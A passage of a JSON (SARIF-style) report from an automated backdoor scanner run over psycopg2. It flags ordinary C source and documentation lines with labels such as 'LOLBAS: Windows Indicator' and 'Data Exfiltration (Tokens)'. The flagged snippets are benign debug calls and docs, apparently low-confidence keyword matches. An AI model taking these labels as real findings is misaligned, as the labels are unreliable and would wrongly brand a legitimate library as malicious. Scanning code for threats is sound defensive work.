                      "markdown": "`        cast = psyco_default_cast;\n    }\n\n    Dprintf(\"_pq_fetch_tuples: using cast at %p for type %u\", cast, ftype);\n\n    /* success */\n    Py_INCREF(cast);\n`"
                    }
                  },
                  "sourceLanguage": "c"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/psycopg/pqpath.c"
                },
                "region": {
                  "startLine": 950,
                  "startColumn": 38,
                  "endLine": 950,
                  "endColumn": 42,
                  "snippet": {
                    "text": "        PyErr_SetString(OperationalError, PQerrorMessage(curs->conn->pgconn));\n        return -1;\n    }\n    Dprintf(\"pq_execute: pg connection at %p OK\", curs->conn->pgconn);\n\n    if (!async) {\n        return _pq_execute_sync(curs, query, no_result, no_begin);\n",
                    "rendered": {
                      "text": "        PyErr_SetString(OperationalError, PQerrorMessage(curs->conn->pgconn));\n        return -1;\n    }\n    Dprintf(\"pq_execute: pg connection at %p OK\", curs->conn->pgconn);\n\n    if (!async) {\n        return _pq_execute_sync(curs, query, no_result, no_begin);\n",
                      "markdown": "`        PyErr_SetString(OperationalError, PQerrorMessage(curs->conn->pgconn));\n        return -1;\n    }\n    Dprintf(\"pq_execute: pg connection at %p OK\", curs->conn->pgconn);\n\n    if (!async) {\n        return _pq_execute_sync(curs, query, no_result, no_begin);\n`"
                    }
                  },
                  "sourceLanguage": "c"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/psycopg/pqpath.c"
                },
                "region": {
                  "startLine": 219,
                  "startColumn": 50,
                  "endLine": 219,
                  "endColumn": 54,
                  "snippet": {
                    "text": "       accept another query */\n\n    while ((pgres = PQgetResult(conn->pgconn))) {\n        Dprintf(\"pq_clear_async: clearing PGresult at %p\", pgres);\n        PQclear(pgres);\n    }\n    Py_CLEAR(conn->async_cursor);\n",
                    "rendered": {
                      "text": "       accept another query */\n\n    while ((pgres = PQgetResult(conn->pgconn))) {\n        Dprintf(\"pq_clear_async: clearing PGresult at %p\", pgres);\n        PQclear(pgres);\n    }\n    Py_CLEAR(conn->async_cursor);\n",
                      "markdown": "`       accept another query */\n\n    while ((pgres = PQgetResult(conn->pgconn))) {\n        Dprintf(\"pq_clear_async: clearing PGresult at %p\", pgres);\n        PQclear(pgres);\n    }\n    Py_CLEAR(conn->async_cursor);\n`"
                    }
                  },
                  "sourceLanguage": "c"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/psycopg/pqpath.c"
                },
                "region": {
                  "startLine": 950,
                  "startColumn": 24,
                  "endLine": 950,
                  "endColumn": 28,
                  "snippet": {
                    "text": "        PyErr_SetString(OperationalError, PQerrorMessage(curs->conn->pgconn));\n        return -1;\n    }\n    Dprintf(\"pq_execute: pg connection at %p OK\", curs->conn->pgconn);\n\n    if (!async) {\n        return _pq_execute_sync(curs, query, no_result, no_begin);\n",
                    "rendered": {
                      "text": "        PyErr_SetString(OperationalError, PQerrorMessage(curs->conn->pgconn));\n        return -1;\n    }\n    Dprintf(\"pq_execute: pg connection at %p OK\", curs->conn->pgconn);\n\n    if (!async) {\n        return _pq_execute_sync(curs, query, no_result, no_begin);\n",
                      "markdown": "`        PyErr_SetString(OperationalError, PQerrorMessage(curs->conn->pgconn));\n        return -1;\n    }\n    Dprintf(\"pq_execute: pg connection at %p OK\", curs->conn->pgconn);\n\n    if (!async) {\n        return _pq_execute_sync(curs, query, no_result, no_begin);\n`"
                    }
                  },
                  "sourceLanguage": "c"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/psycopg/adapter_asis.c"
                },
                "region": {
                  "startLine": 126,
                  "startColumn": 46,
                  "endLine": 126,
                  "endColumn": 50,
                  "snippet": {
                    "text": "\n    Py_CLEAR(self->wrapped);\n\n    Dprintf(\"asis_dealloc: deleted asis object at %p, refcnt = \"\n        FORMAT_CODE_PY_SSIZE_T,\n        obj, Py_REFCNT(obj)\n      );\n",
                    "rendered": {
                      "text": "\n    Py_CLEAR(self->wrapped);\n\n    Dprintf(\"asis_dealloc: deleted asis object at %p, refcnt = \"\n        FORMAT_CODE_PY_SSIZE_T,\n        obj, Py_REFCNT(obj)\n      );\n",
                      "markdown": "`\n    Py_CLEAR(self->wrapped);\n\n    Dprintf(\"asis_dealloc: deleted asis object at %p, refcnt = \"\n        FORMAT_CODE_PY_SSIZE_T,\n        obj, Py_REFCNT(obj)\n      );\n`"
                    }
                  },
                  "sourceLanguage": "c"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/psycopg/adapter_asis.c"
                },
                "region": {
                  "startLine": 112,
                  "startColumn": 41,
                  "endLine": 112,
                  "endColumn": 45,
                  "snippet": {
                    "text": "    Py_INCREF(obj);\n    self->wrapped = obj;\n\n    Dprintf(\"asis_setup: good asis object at %p, refcnt = \"\n        FORMAT_CODE_PY_SSIZE_T,\n        self, Py_REFCNT(self)\n      );\n",
                    "rendered": {
                      "text": "    Py_INCREF(obj);\n    self->wrapped = obj;\n\n    Dprintf(\"asis_setup: good asis object at %p, refcnt = \"\n        FORMAT_CODE_PY_SSIZE_T,\n        self, Py_REFCNT(self)\n      );\n",
                      "markdown": "`    Py_INCREF(obj);\n    self->wrapped = obj;\n\n    Dprintf(\"asis_setup: good asis object at %p, refcnt = \"\n        FORMAT_CODE_PY_SSIZE_T,\n        self, Py_REFCNT(self)\n      );\n`"
                    }
                  },
                  "sourceLanguage": "c"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/psycopg/adapter_asis.c"
                },
                "region": {
                  "startLine": 104,
                  "startColumn": 41,
                  "endLine": 104,
                  "endColumn": 45,
                  "snippet": {
                    "text": "static int\nasis_setup(asisObject *self, PyObject *obj)\n{\n    Dprintf(\"asis_setup: init asis object at %p, refcnt = \"\n        FORMAT_CODE_PY_SSIZE_T,\n        self, Py_REFCNT(self)\n      );\n",
                    "rendered": {
                      "text": "static int\nasis_setup(asisObject *self, PyObject *obj)\n{\n    Dprintf(\"asis_setup: init asis object at %p, refcnt = \"\n        FORMAT_CODE_PY_SSIZE_T,\n        self, Py_REFCNT(self)\n      );\n",
                      "markdown": "`static int\nasis_setup(asisObject *self, PyObject *obj)\n{\n    Dprintf(\"asis_setup: init asis object at %p, refcnt = \"\n        FORMAT_CODE_PY_SSIZE_T,\n        self, Py_REFCNT(self)\n      );\n`"
                    }
                  },
                  "sourceLanguage": "c"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/psycopg/bytes_format.c"
                },
                "region": {
                  "startLine": 193,
                  "startColumn": 24,
                  "endLine": 193,
                  "endColumn": 29,
                  "snippet": {
                    "text": "                        ++pcount;\n                    fmt++;\n                }\n                keylen = fmt - keystart - 1;\n                if (fmtcnt < 0 || pcount > 0) {\n                    PyErr_SetString(PyExc_ValueError,\n                               \"incomplete format key\");\n",
                    "rendered": {
                      "text": "                        ++pcount;\n                    fmt++;\n                }\n                keylen = fmt - keystart - 1;\n                if (fmtcnt < 0 || pcount > 0) {\n                    PyErr_SetString(PyExc_ValueError,\n                               \"incomplete format key\");\n",
                      "markdown": "`                        ++pcount;\n                    fmt++;\n                }\n                keylen = fmt - keystart - 1;\n                if (fmtcnt < 0 || pcount > 0) {\n                    PyErr_SetString(PyExc_ValueError,\n                               \"incomplete format key\");\n`"
                    }
                  },
                  "sourceLanguage": "c"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/psycopg/bytes_format.c"
                },
                "region": {
                  "startLine": 131,
                  "startColumn": 3,
                  "endLine": 131,
                  "endColumn": 8,
                  "snippet": {
                    "text": "        PyErr_SetString(PyExc_SystemError, \"bad argument to internal function\");\n        return NULL;\n    }\n    fmt = Bytes_AS_STRING(format);\n    fmtcnt = Bytes_GET_SIZE(format);\n    reslen = rescnt = fmtcnt + 100;\n    result = Bytes_FromStringAndSize((char *)NULL, reslen);\n",
                    "rendered": {
                      "text": "        PyErr_SetString(PyExc_SystemError, \"bad argument to internal function\");\n        return NULL;\n    }\n    fmt = Bytes_AS_STRING(format);\n    fmtcnt = Bytes_GET_SIZE(format);\n    reslen = rescnt = fmtcnt + 100;\n    result = Bytes_FromStringAndSize((char *)NULL, reslen);\n",
                      "markdown": "`        PyErr_SetString(PyExc_SystemError, \"bad argument to internal function\");\n        return NULL;\n    }\n    fmt = Bytes_AS_STRING(format);\n    fmtcnt = Bytes_GET_SIZE(format);\n    reslen = rescnt = fmtcnt + 100;\n    result = Bytes_FromStringAndSize((char *)NULL, reslen);\n`"
                    }
                  },
                  "sourceLanguage": "c"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/psycopg/connection.h"
                },
                "region": {
                  "startLine": 172,
                  "startColumn": 26,
                  "endLine": 172,
                  "endColumn": 34,
                  "snippet": {
                    "text": "HIDDEN void conn_notifies_process(connectionObject *self);\nRAISES_NEG HIDDEN int conn_setup(connectionObject *self);\nHIDDEN int  conn_connect(connectionObject *self, const char *dsn, long int async);\nHIDDEN char *conn_obscure_password(const char *dsn);\nHIDDEN void conn_close(connectionObject *self);\nHIDDEN void conn_close_locked(connectionObject *self);\nRAISES_NEG HIDDEN int  conn_commit(connectionObject *self);\n",
                    "rendered": {
                      "text": "HIDDEN void conn_notifies_process(connectionObject *self);\nRAISES_NEG HIDDEN int conn_setup(connectionObject *self);\nHIDDEN int  conn_connect(connectionObject *self, const char *dsn, long int async);\nHIDDEN char *conn_obscure_password(const char *dsn);\nHIDDEN void conn_close(connectionObject *self);\nHIDDEN void conn_close_locked(connectionObject *self);\nRAISES_NEG HIDDEN int  conn_commit(connectionObject *self);\n",
                      "markdown": "`HIDDEN void conn_notifies_process(connectionObject *self);\nRAISES_NEG HIDDEN int conn_setup(connectionObject *self);\nHIDDEN int  conn_connect(connectionObject *self, const char *dsn, long int async);\nHIDDEN char *conn_obscure_password(const char *dsn);\nHIDDEN void conn_close(connectionObject *self);\nHIDDEN void conn_close_locked(connectionObject *self);\nRAISES_NEG HIDDEN int  conn_commit(connectionObject *self);\n`"
                    }
                  },
                  "sourceLanguage": "c"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/doc/src/extras.rst"
                },
                "region": {
                  "startLine": 998,
                  "startColumn": 34,
                  "endLine": 998,
                  "endColumn": 38,
                  "snippet": {
                    "text": ".. doctest::\n\n    >>> psycopg2.extras.register_inet()\n    <psycopg2._psycopg.type object at 0x...>\n\n    >>> cur.mogrify(\"SELECT %s\", (Inet('127.0.0.1/32'),))\n    \"SELECT E'127.0.0.1/32'::inet\"\n",
                    "rendered": {
                      "text": ".. doctest::\n\n    >>> psycopg2.extras.register_inet()\n    <psycopg2._psycopg.type object at 0x...>\n\n    >>> cur.mogrify(\"SELECT %s\", (Inet('127.0.0.1/32'),))\n    \"SELECT E'127.0.0.1/32'::inet\"\n",
                      "markdown": "`.. doctest::\n\n    >>> psycopg2.extras.register_inet()\n    <psycopg2._psycopg.type object at 0x...>\n\n    >>> cur.mogrify(\"SELECT %s\", (Inet('127.0.0.1/32'),))\n    \"SELECT E'127.0.0.1/32'::inet\"\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/doc/src/extras.rst"
                },
                "region": {
                  "startLine": 949,
                  "startColumn": 34,
                  "endLine": 949,
                  "endColumn": 38,
                  "snippet": {
                    "text": ".. doctest::\n\n    >>> psycopg2.extras.register_uuid()\n    <psycopg2._psycopg.type object at 0x...>\n\n    >>> # Python UUID can be used in SQL queries\n    >>> import uuid\n",
                    "rendered": {
                      "text": ".. doctest::\n\n    >>> psycopg2.extras.register_uuid()\n    <psycopg2._psycopg.type object at 0x...>\n\n    >>> # Python UUID can be used in SQL queries\n    >>> import uuid\n",
                      "markdown": "`.. doctest::\n\n    >>> psycopg2.extras.register_uuid()\n    <psycopg2._psycopg.type object at 0x...>\n\n    >>> # Python UUID can be used in SQL queries\n    >>> import uuid\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/doc/src/extras.rst"
                },
                "region": {
                  "startLine": 751,
                  "startColumn": 43,
                  "endLine": 751,
                  "endColumn": 47,
                  "snippet": {
                    "text": "\n    >>> cur.execute(\"CREATE TYPE card_back AS (face card, back text);\")\n    >>> psycopg2.extras.register_composite('card_back', cur)\n    <psycopg2.extras.CompositeCaster object at 0x...>\n\n    >>> cur.execute(\"select ((8, 'hearts'), 'blue')::card_back\")\n    >>> cur.fetchone()[0]\n",
                    "rendered": {
                      "text": "\n    >>> cur.execute(\"CREATE TYPE card_back AS (face card, back text);\")\n    >>> psycopg2.extras.register_composite('card_back', cur)\n    <psycopg2.extras.CompositeCaster object at 0x...>\n\n    >>> cur.execute(\"select ((8, 'hearts'), 'blue')::card_back\")\n    >>> cur.fetchone()[0]\n",
                      "markdown": "`\n    >>> cur.execute(\"CREATE TYPE card_back AS (face card, back text);\")\n    >>> psycopg2.extras.register_composite('card_back', cur)\n    <psycopg2.extras.CompositeCaster object at 0x...>\n\n    >>> cur.execute(\"select ((8, 'hearts'), 'blue')::card_back\")\n    >>> cur.fetchone()[0]\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/doc/src/extras.rst"
                },
                "region": {
                  "startLine": 738,
                  "startColumn": 43,
                  "endLine": 738,
                  "endColumn": 47,
                  "snippet": {
                    "text": "\n    >>> cur.execute(\"CREATE TYPE card AS (value int, suit text);\")\n    >>> psycopg2.extras.register_composite('card', cur)\n    <psycopg2.extras.CompositeCaster object at 0x...>\n\n    >>> cur.execute(\"select (8, 'hearts')::card\")\n    >>> cur.fetchone()[0]\n",
                    "rendered": {
                      "text": "\n    >>> cur.execute(\"CREATE TYPE card AS (value int, suit text);\")\n    >>> psycopg2.extras.register_composite('card', cur)\n    <psycopg2.extras.CompositeCaster object at 0x...>\n\n    >>> cur.execute(\"select (8, 'hearts')::card\")\n    >>> cur.fetchone()[0]\n",
                      "markdown": "`\n    >>> cur.execute(\"CREATE TYPE card AS (value int, suit text);\")\n    >>> psycopg2.extras.register_composite('card', cur)\n    <psycopg2.extras.CompositeCaster object at 0x...>\n\n    >>> cur.execute(\"select (8, 'hearts')::card\")\n    >>> cur.fetchone()[0]\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/doc/src/extras.rst"
                },
                "region": {
                  "startLine": 514,
                  "startColumn": 59,
                  "endLine": 514,
                  "endColumn": 63,
                  "snippet": {
                    "text": "\n    .. attribute:: wal_end\n\n       LSN position of the current end of WAL on the server at the\n       moment of last data or keepalive message received from the\n       server.\n\n",
                    "rendered": {
                      "text": "\n    .. attribute:: wal_end\n\n       LSN position of the current end of WAL on the server at the\n       moment of last data or keepalive message received from the\n       server.\n\n",
                      "markdown": "`\n    .. attribute:: wal_end\n\n       LSN position of the current end of WAL on the server at the\n       moment of last data or keepalive message received from the\n       server.\n\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/doc/src/extras.rst"
                },
                "region": {
                  "startLine": 507,
                  "startColumn": 55,
                  "endLine": 507,
                  "endColumn": 59,
                  "snippet": {
                    "text": "\n    .. attribute:: feedback_timestamp\n\n        A `~datetime` object representing the timestamp at the moment when\n        the last feedback message sent to the server.\n\n        .. versionadded:: 2.8.3\n",
                    "rendered": {
                      "text": "\n    .. attribute:: feedback_timestamp\n\n        A `~datetime` object representing the timestamp at the moment when\n        the last feedback message sent to the server.\n\n        .. versionadded:: 2.8.3\n",
                      "markdown": "`\n    .. attribute:: feedback_timestamp\n\n        A `~datetime` object representing the timestamp at the moment when\n        the last feedback message sent to the server.\n\n        .. versionadded:: 2.8.3\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/doc/src/extras.rst"
                },
                "region": {
                  "startLine": 501,
                  "startColumn": 55,
                  "endLine": 501,
                  "endColumn": 59,
                  "snippet": {
                    "text": "\n    .. attribute:: io_timestamp\n\n        A `~datetime` object representing the timestamp at the moment of last\n        communication with the server (a data or keepalive message in either\n        direction).\n\n",
                    "rendered": {
                      "text": "\n    .. attribute:: io_timestamp\n\n        A `~datetime` object representing the timestamp at the moment of last\n        communication with the server (a data or keepalive message in either\n        direction).\n\n",
                      "markdown": "`\n    .. attribute:: io_timestamp\n\n        A `~datetime` object representing the timestamp at the moment of last\n        communication with the server (a data or keepalive message in either\n        direction).\n\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/doc/src/extras.rst"
                },
                "region": {
                  "startLine": 468,
                  "startColumn": 49,
                  "endLine": 468,
                  "endColumn": 53,
                  "snippet": {
                    "text": "\n        Try to read the next message from the server without blocking and\n        return an instance of `ReplicationMessage` or `!None`, in case there\n        are no more data messages from the server at the moment.\n\n        This method should be used in a loop with asynchronous connections\n        (after calling `start_replication()` once).  For synchronous\n",
                    "rendered": {
                      "text": "\n        Try to read the next message from the server without blocking and\n        return an instance of `ReplicationMessage` or `!None`, in case there\n        are no more data messages from the server at the moment.\n\n        This method should be used in a loop with asynchronous connections\n        (after calling `start_replication()` once).  For synchronous\n",
                      "markdown": "`\n        Try to read the next message from the server without blocking and\n        return an instance of `ReplicationMessage` or `!None`, in case there\n        are no more data messages from the server at the moment.\n\n        This method should be used in a loop with asynchronous connections\n        (after calling `start_replication()` once).  For synchronous\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/doc/src/extras.rst"
                },
                "region": {
                  "startLine": 460,
                  "startColumn": 16,
                  "endLine": 460,
                  "endColumn": 20,
                  "snippet": {
                    "text": "\n    With the synchronous connection a call to `consume_stream()` handles all\n    the complexity of handling the incoming messages and sending keepalive\n    replies, but at times it might be beneficial to use low-level interface\n    for better control, in particular to `~select` on multiple sockets.  The\n    following methods are provided for asynchronous operation:\n\n",
                    "rendered": {
                      "text": "\n    With the synchronous connection a call to `consume_stream()` handles all\n    the complexity of handling the incoming messages and sending keepalive\n    replies, but at times it might be beneficial to use low-level interface\n    for better control, in particular to `~select` on multiple sockets.  The\n    following methods are provided for asynchronous operation:\n\n",
                      "markdown": "`\n    With the synchronous connection a call to `consume_stream()` handles all\n    the complexity of handling the incoming messages and sending keepalive\n    replies, but at times it might be beneficial to use low-level interface\n    for better control, in particular to `~select` on multiple sockets.  The\n    following methods are provided for asynchronous operation:\n\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/doc/src/extras.rst"
                },
                "region": {
                  "startLine": 446,
                  "startColumn": 12,
                  "endLine": 446,
                  "endColumn": 20,
                  "snippet": {
                    "text": "        discarded on the server.\n\n        If the *reply* or *force* parameters are not set, this method will\n        just update internal structures without sending the feedback message\n        to the server. The library sends feedback message automatically\n        when *status_interval* timeout is reached. For this to work, you must\n        call `send_feedback()` on the same Cursor that you called `start_replication()`\n",
                    "rendered": {
                      "text": "        discarded on the server.\n\n        If the *reply* or *force* parameters are not set, this method will\n        just update internal structures without sending the feedback message\n        to the server. The library sends feedback message automatically\n        when *status_interval* timeout is reached. For this to work, you must\n        call `send_feedback()` on the same Cursor that you called `start_replication()`\n",
                      "markdown": "`        discarded on the server.\n\n        If the *reply* or *force* parameters are not set, this method will\n        just update internal structures without sending the feedback message\n        to the server. The library sends feedback message automatically\n        when *status_interval* timeout is reached. For this to work, you must\n        call `send_feedback()` on the same Cursor that you called `start_replication()`\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/doc/src/extras.rst"
                },
                "region": {
                  "startLine": 394,
                  "startColumn": 17,
                  "endLine": 394,
                  "endColumn": 21,
                  "snippet": {
                    "text": "\n        This method also sends feedback messages to the server every\n        *keepalive_interval* (in seconds). The value of this parameter must\n        be set to at least 1 second, but it can have a fractional part.\n        If the *keepalive_interval* is not specified, the value of\n        *status_interval* specified in the `start_replication()` or\n        `start_replication_expert()` will be used.\n",
                    "rendered": {
                      "text": "\n        This method also sends feedback messages to the server every\n        *keepalive_interval* (in seconds). The value of this parameter must\n        be set to at least 1 second, but it can have a fractional part.\n        If the *keepalive_interval* is not specified, the value of\n        *status_interval* specified in the `start_replication()` or\n        `start_replication_expert()` will be used.\n",
                      "markdown": "`\n        This method also sends feedback messages to the server every\n        *keepalive_interval* (in seconds). The value of this parameter must\n        be set to at least 1 second, but it can have a fractional part.\n        If the *keepalive_interval* is not specified, the value of\n        *status_interval* specified in the `start_replication()` or\n        `start_replication_expert()` will be used.\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/doc/src/extras.rst"
                },
                "region": {
                  "startLine": 382,
                  "startColumn": 45,
                  "endLine": 382,
                  "endColumn": 49,
                  "snippet": {
                    "text": "        `start_replication()` first.\n\n        This method enters an endless loop reading messages from the server\n        and passing them to ``consume()`` one at a time, then waiting for more\n        messages from the server.  In order to make this method break out of\n        the loop and return, ``consume()`` can throw a `StopReplication`\n        exception.  Any unhandled exception will make it break out of the loop\n",
                    "rendered": {
                      "text": "        `start_replication()` first.\n\n        This method enters an endless loop reading messages from the server\n        and passing them to ``consume()`` one at a time, then waiting for more\n        messages from the server.  In order to make this method break out of\n        the loop and return, ``consume()`` can throw a `StopReplication`\n        exception.  Any unhandled exception will make it break out of the loop\n",
                      "markdown": "`        `start_replication()` first.\n\n        This method enters an endless loop reading messages from the server\n        and passing them to ``consume()`` one at a time, then waiting for more\n        messages from the server.  In order to make this method break out of\n        the loop and return, ``consume()`` can throw a `StopReplication`\n        exception.  Any unhandled exception will make it break out of the loop\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/doc/src/extras.rst"
                },
                "region": {
                  "startLine": 336,
                  "startColumn": 50,
                  "endLine": 336,
                  "endColumn": 54,
                  "snippet": {
                    "text": "        to prevent disconnect via timeout. Feedback is automatically sent when\n        `read_message()` is called or during run of the `consume_stream()`.\n        To specify the feedback interval use *status_interval* parameter.\n        The value of this parameter must be set to at least 1 second, but\n        it can have a fractional part.\n\n\n",
                    "rendered": {
                      "text": "        to prevent disconnect via timeout. Feedback is automatically sent when\n        `read_message()` is called or during run of the `consume_stream()`.\n        To specify the feedback interval use *status_interval* parameter.\n        The value of this parameter must be set to at least 1 second, but\n        it can have a fractional part.\n\n\n",
